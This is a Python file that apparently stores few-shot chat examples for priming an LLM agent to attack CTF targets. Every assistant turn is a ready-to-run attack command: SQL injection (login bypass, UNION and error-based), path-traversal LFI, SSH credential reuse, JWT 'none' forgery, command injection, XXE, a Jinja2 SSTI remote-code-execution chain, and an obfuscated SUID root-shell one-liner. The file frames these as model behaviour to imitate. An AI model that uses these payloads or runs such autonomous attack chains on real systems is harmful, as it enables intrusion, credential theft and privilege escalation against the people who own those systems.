"""
Ozz — Prompt Engineering: Few-Shot Examples
Exemplos de decisões corretas em situações reais de CTF.
Usados para calibrar o LLM antes de ataques reais.
"""

FEW_SHOT_EXAMPLES = [
    # === RECON PHASE ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: RECON
No previous findings.

What's your first action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "Starting with a quick scan to discover services. I'll use quick_scan which combines nmap service detection with web fingerprinting in one call. This gives me maximum info with minimum actions.",
  "action": "quick_scan",
  "action_input": "10.0.0.10"
}"""
    },

    # === RECON → ENUM TRANSITION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: RECON
Last result: nmap shows ports 22 (SSH), 80 (HTTP nginx 1.18), 443 (HTTPS)
Previous findings: nginx 1.18, PHP 7.4 detected

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I found HTTP with nginx and PHP. This is promising — PHP 7.4 has known vulns and web apps often have LFI/SQLi. I should enumerate the web app before moving to SSH. Let me check the web root and look for common files.",
  "action": "curl",
  "action_input": "-s -L http://10.0.0.10/"
}"""
    },

    # === SQLI DETECTION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: ENUMERATION
Last result: Web portal with login form at /?page=login. Form has username and password fields.
Previous findings: nginx 1.18, PHP 7.4, SQLite backend

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "Login form detected — classic SQLi target. I'll test with a simple boolean-based injection: username=admin'-- to bypass password check. The -- comments out the password condition in SQL.",
  "action": "curl",
  "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=test\""
}"""
    },

    # === SQLI CONFIRMED → ENUMERATE ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: ENUMERATION
Last result: SQLi worked! Response: 'Welcome, admin! Role: admin. Go to Dashboard'
Previous findings: SQLi in login, admin access gained

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "SQLi confirmed and I have admin access. Now I need to extract useful data — credentials, secrets, and the flag. Let me check the dashboard for admin-only features.",
  "action": "curl",
  "action_input": "-s 'http://10.0.0.10/?page=dashboard&action=view_secrets'"
}"""
    },

    # === LFI DETECTION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: Found 'reports' page with ?file= parameter. It loads files from the server.
Previous findings: SQLi, admin access, db_password in secrets

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "A ?file= parameter that loads server files — classic LFI vulnerability. I'll test with /etc/passwd to confirm, then try to read the flag file. Using path traversal with ../",
  "action": "curl",
  "action_input": "-s 'http://10.0.0.10/?page=reports&file=../../../../etc/passwd'"
}"""
    },

    # === FLAG FOUND ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: LFI successful! File contents: flag{web_master_2026}
Previous findings: SQLi, LFI, admin access

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "FLAG FOUND via LFI! Submitting immediately. After this, I should extract any credentials from the server that might help pivot to other targets.",
  "action": "submit_flag",
  "action_input": "flag{web_master_2026}"
}"""
    },

    # === SSH BRUTE FORCE ===
    {
        "role": "user",
        "content": """Target: 10.0.0.20
Phase: ENUMERATION
Last result: SSH on port 22, Samba on 445. SSH banner: OpenSSH 8.2
Previous findings: From TARGET-01, found potential credentials in config: admin:password123

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I found credentials from the previous target: admin:password123. Before brute-forcing, let me try credential reuse — it's faster and more reliable. If that fails, I'll use hydra.",
  "action": "shell",
  "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 admin@10.0.0.20 'whoami; cat /home/admin/flag.txt 2>/dev/null; cat /opt/config.ini 2>/dev/null'"
}"""
    },

    # === SSTI DETECTION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.30
Phase: ENUMERATION
Last result: Flask API on port 5000. Found /render endpoint that accepts template parameter.
Previous findings: API docs mention default credentials admin/admin2026

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "A /render endpoint with template parameter — prime SSTI target. I'll test with {{7*7}} first. If it returns 49, template injection is confirmed and I can escalate to RCE.",
  "action": "curl",
  "action_input": "-s -X POST http://10.0.0.30:5000/render -H 'Content-Type: application/json' -d '{\"template\":\"{{7*7}}\",\"name\":\"test\"}'"
}"""
    },

    # === JWT BYPASS ===
    {
        "role": "user",
        "content": """Target: 10.0.0.30
Phase: EXPLOITATION
Last result: Login successful with admin/admin2026. Got JWT token.
Previous findings: SSTI confirmed, JWT auth required for /admin

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I have a JWT token. Before using it normally, I should test for algorithm confusion attack — changing alg to 'none' lets me forge any token without knowing the secret. This is a common JWT vulnerability.",
  "action": "shell",
  "action_input": "python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'},'',algorithm='none'))\""
}"""
    },

    # === PIVOT DECISION ===
    {
        "role": "user",
        "content": """Target: Multiple (10.0.0.10, .20, .30 compromised)
Phase: PIVOT
Last result: Found MySQL credentials in config.ini: root:MySQL_R00t_2026!@10.0.0.40
Previous findings: 3 targets compromised, credentials accumulated

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I've accumulated MySQL credentials from multiple targets. 10.0.0.40 is an internal MySQL server — likely the final target with the mega flag. Time to pivot and use all gathered credentials to access it.",
  "action": "shell",
  "action_input": "mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' -e 'SHOW DATABASES; USE corporate; SHOW TABLES; SELECT * FROM internal_secrets;'"
}"""
    },

    # === STUCK / ANTI-LOOP ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last 5 actions: All were curl to the same endpoint with similar payloads. No new information gained.
Previous findings: SQLi confirmed but can't extract data beyond login bypass

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I'm in a loop — same endpoint, same results. I need to change my approach. Instead of more SQLi attempts, let me: 1) Check for other endpoints I haven't explored, 2) Try LFI via the file parameter, 3) Look for debug pages or hidden directories. Time to pivot strategy.",
  "action": "gobuster",
  "action_input": "dir -u http://10.0.0.10 -w /usr/share/wordlists/dirb/common.txt -t 10 --no-error"
}"""
    },

    # === PRIVILEGE ESCALATION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.20
Phase: POST_EXPLOIT
Last result: SSH access as 'admin'. Found flag.txt but need root for other files.
Previous findings: admin user, flag found, /opt/config.ini has MySQL creds

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I have user access but need to check for privilege escalation paths. Let me run the privesc checklist — sudo -l, SUID binaries, capabilities, cron jobs. This is systematic enumeration.",
  "action": "shell",
  "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'sudo -l 2>/dev/null; find / -perm -u=s -type f 2>/dev/null | head -20; getcap -r / 2>/dev/null; cat /etc/crontab 2>/dev/null'"
}"""
    },

    # === FILE TRANSFER ===
    {
        "role": "user",
        "content": """Target: 10.0.0.20
Phase: POST_EXPLOIT
Last result: Found SUID binary /usr/bin/python3. Need to transfer exploit script to target.
Previous findings: SSH access, SUID python3

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "Python3 with SUID is a direct privesc — I can execute os.execl('/bin/sh', 'sh', '-p') to get a root shell. But first, let me check what python3 can do and if it's really exploitable. Actually, I can just run it directly via SSH.",
  "action": "shell",
  "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'python3 -c \"import os; os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104), chr(115)+chr(104), chr(45)+chr(112))\"'"
}"""
    },

    # === CRYPTO / STEGO / FORENSICS ===
    {
        "role": "user",
        "content": """Target: Local Challenge File
Phase: EXPLOITATION
Last result: Found secret image 'challenge.png' and encoded string 'aGFsY3Rme2NyeXB0b19tYXN0ZXJfMjAyNn0='
Previous findings: Crypto/Stego challenge

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "The string 'aGFsY3Rme2NyeXB0b19tYXN0ZXJfMjAyNn0=' ends with '=' which indicates Base64 encoding. I will decode it using python or base64 command to check for the flag. I will also check the image metadata with exiftool.",
  "action": "shell",
  "action_input": "echo 'aGFsY3Rme2NyeXB0b19tYXN0ZXJfMjAyNn0=' | base64 -d; exiftool challenge.png"
}"""
    },

    # === PWN / REVERSE ENGINEERING ===
    {
        "role": "user",
        "content": """Target: Binary file 'vuln_elf'
Phase: ENUMERATION
Last result: Downloaded binary 'vuln_elf'. Need to inspect security controls.
Previous findings: Binary exploitation task

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "I need to inspect the binary's protections (NX, ASLR, PIE, Canary) and check printable strings or symbols. I'll use checksec and strings.",
  "action": "shell",
  "action_input": "checksec --file=vuln_elf 2>/dev/null || file vuln_elf; strings vuln_elf | grep -i flag"
}"""
    },

    # === UNION-BASED SQLI ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: SQLi confirmed on /api/search?q= via single-quote error. SQLite database detected.
Previous findings: SQLi boolean-based works, but login bypass only shows admin page, no flag

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "Boolean-based SQLi only bypasses auth — I need to extract actual data. UNION-based injection lets me pull data from other tables. First, I need to find the column count with ORDER BY, then craft the UNION SELECT to dump table names from sqlite_master.",
  "action": "curl",
  "action_input": "-s 'http://10.0.0.10/api/search?q=test' UNION SELECT 1,2,3,group_concat(name) FROM sqlite_master WHERE type='table'--"
}"""
    },

    # === ERROR-BASED SQLI ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: MySQL backend detected. UNION injection blocked by WAF.
Previous findings: SQLi confirmed via error messages, WAF filters UNION and SELECT

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "WAF blocks UNION/SELECT but error messages leak data. I'll use error-based injection with UPDATEXML or EXTRACTVALUE to force MySQL to dump database contents in the error message. These functions aren't typically filtered.",
  "action": "curl",
  "action_input": "-s 'http://10.0.0.10/search?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)'"
}"""
    },

    # === COMMAND INJECTION ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: Found /api/ping endpoint that takes a 'host' parameter and returns ping output.
Previous findings: Web app, nginx, PHP, ping functionality exposed

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "A ping endpoint that passes user input to the shell — classic command injection. I'll chain commands with a semicolon to break out of the ping command. First test with id, then escalate to reading flags.",
  "action": "curl",
  "action_input": "-s 'http://10.0.0.10/api/ping?host=127.0.0.1;id;cat /flag.txt'"
}"""
    },

    # === XXE ===
    {
        "role": "user",
        "content": """Target: 10.0.0.10
Phase: EXPLOITATION
Last result: Found /api/import endpoint that accepts XML uploads for data import.
Previous findings: Web app with XML parsing, REST API

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "An XML import endpoint is a prime XXE target. I'll inject an external entity that reads /etc/passwd to confirm, then escalate to read the flag. The XML parser likely has external entity processing enabled.",
  "action": "curl",
  "action_input": "-s -X POST http://10.0.0.10/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><value>&xxe;</value></data>'"
}"""
    },

    # === SSTI TO RCE ===
    {
        "role": "user",
        "content": """Target: 10.0.0.30
Phase: EXPLOITATION
Last result: SSTI confirmed — {{7*7}} returned 49. Jinja2 template engine detected.
Previous findings: SSTI in /render endpoint, need to escalate to RCE

What's your next action?"""
    },
    {
        "role": "assistant",
        "content": """{
  "thought": "SSTI confirmed in Jinja2. The classic RCE chain is using config.__class__.__mro__[1].__subclasses__() to find os._wrap_close or subprocess.Popen. I'll use the MRO traversal to pop a shell and read the flag.",
  "action": "curl",
  "action_input": "-s -X POST http://10.0.0.30:5000/render -H 'Content-Type: application/json' -d '{\"template\":\"{{config.__class__.__mro__[1].__subclasses__()[258](\\\"cat /flag.txt\\\",shell=True,stdout=-1).communicate()[0]}}\",\"name\":\"test\"}'"
}"""
    },
]


def get_few_shot_prompt() -> str:
    """Retorna os few-shot examples formatados para o prompt."""
    lines = []
    for ex in FEW_SHOT_EXAMPLES:
        lines.append(f"<|{ex['role']}|>\n{ex['content']}")
    return "\n\n".join(lines)


def get_few_shot_messages() -> list[dict]:
    """Retorna os few-shot examples como lista de mensagens."""
    return [
        {"role": ex["role"], "content": ex["content"]}
        for ex in FEW_SHOT_EXAMPLES
    ]
